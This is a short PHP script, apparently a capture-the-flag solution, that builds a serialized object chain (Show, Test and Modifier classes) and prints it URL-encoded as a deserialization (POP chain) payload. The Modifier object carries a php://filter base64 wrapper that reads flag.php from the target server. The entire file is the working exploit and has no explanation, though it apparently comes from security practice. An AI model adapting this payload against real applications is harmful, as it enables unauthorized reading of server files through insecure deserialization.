<?php
class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
}
class Show{
    public $source;
    public $str;
}
class Test{
    public $p;
}
$a = new Show();
$b= new Show();
$a->source=$b;
$b->str=new Test();
($b->str)->p=new Modifier();
echo urlencode(serialize($a));